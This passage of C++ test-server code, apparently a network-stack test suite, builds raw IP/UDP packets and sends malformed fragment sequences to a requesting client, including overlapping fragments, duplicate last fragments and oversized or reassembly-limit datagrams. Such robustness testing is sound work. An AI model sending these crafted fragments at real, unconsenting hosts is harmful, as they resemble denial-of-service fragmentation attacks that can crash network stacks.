			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			// Based on which packet we are sending set the payload data and the fragment offset
			switch(i)
			{
				CUDPPacket *pUDPPacket;
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(72);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 24);
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 24, TRUE);
				break;
			case 1:
				pIPPacket->IPHeader.SetFragOffset(4);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'b', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 2:
				pIPPacket->IPHeader.SetFragOffset(6);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'c', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFragOffset(7);
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'d', sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			}
						
			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOneHundredServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 100-part fragmented datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOneHundredServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 100; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == 99) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset(i * 2);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(1600);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMultipleLastFragmentServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 100-part fragmented datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMultipleLastFragmentServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 3; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(48);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				break;
			case 1:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(4);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(2);
				break;
			}
			
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOverlappingFragmentsServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends 7 fragments containing overlapping data
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOverlappingFragmentsServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[16];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 7; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(40);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'a', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 1:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(1);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'a', 8);
				memset(PayloadBuffer + 8, (int)'b', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 2:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(2);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'b', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 3:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(2);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'b', 8);
				memset(PayloadBuffer + 8, (int)'c', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 4:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(3);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'c', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 5:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(3);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'c', 8);
				memset(PayloadBuffer + 8, (int)'d', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(4);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'d', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			}
			
			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxDatagramSizeServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 64 1K (one is 1K - 1) fragments of a datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxDatagramSizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 64; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 1);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == 63) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset(i * 128);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			switch(i)
			{
			case 0:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			case 63:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1023);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1023, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1024, TRUE);
				break;
			}


			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64 * 1024 - 1);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxReassemblySizeServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of a 2K datagram (exactly default max reassembly size)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxReassemblySizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr);

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 2);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetDestPort(pSessionInfo->LowPort);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(2 * 1024);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(128);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1024, TRUE);
				break;
			}

			// Send the packet
			pSessionInfo->pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			_tprintf(TEXT("EXCEPTION: %s\n"),Ex->GetMessage());
			delete Ex;
			
		}

		// Release the packet
		if(pIPPacket)
		{
			(i == 0) ? delete (CUDPPacket *) pIPPacket : delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragAboveMaxReassemblySizeServ
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of a 2K + 1 datagram (one above default max reassembly size)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxReassemblySizeServ (DWORD FromAddr, PSESSION_INFO pSessionInfo)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	IN_ADDR ClientAddr;
	CHAR szClientMacAddr[18], szClientIPAddr[16];
	BYTE PayloadBuffer[1024];
	BOOL fUDPPacket = FALSE;

	sprintf(szClientMacAddr, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		pSessionInfo->pCurrentRequest->MacAddr[1],
		pSessionInfo->pCurrentRequest->MacAddr[2],
		pSessionInfo->pCurrentRequest->MacAddr[3],
		pSessionInfo->pCurrentRequest->MacAddr[4],
		pSessionInfo->pCurrentRequest->MacAddr[5],
		pSessionInfo->pCurrentRequest->MacAddr[6],
		pSessionInfo->pCurrentRequest->MacAddr[7],
		pSessionInfo->pCurrentRequest->MacAddr[8],
		pSessionInfo->pCurrentRequest->MacAddr[9],
		pSessionInfo->pCurrentRequest->MacAddr[10],
		pSessionInfo->pCurrentRequest->MacAddr[11],
		pSessionInfo->pCurrentRequest->MacAddr[12]);

	// Hard-code the address for now.  We'll work something better out later.
	MAC_MEDIA_TYPE MediaType = pSessionInfo->pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szClientMacAddr); // tristanjX

	// Calculate the server address string
	ClientAddr.S_un.S_addr = FromAddr;

	// Calculate the server address string
	strcpy(szClientIPAddr, inet_ntoa((IN_ADDR) ClientAddr));

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pSessionInfo->pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 3);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(szClientIPAddr);
			pIPPacket->IPHeader.SetSrcAddr(pSessionInfo->szServerIPAddr);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
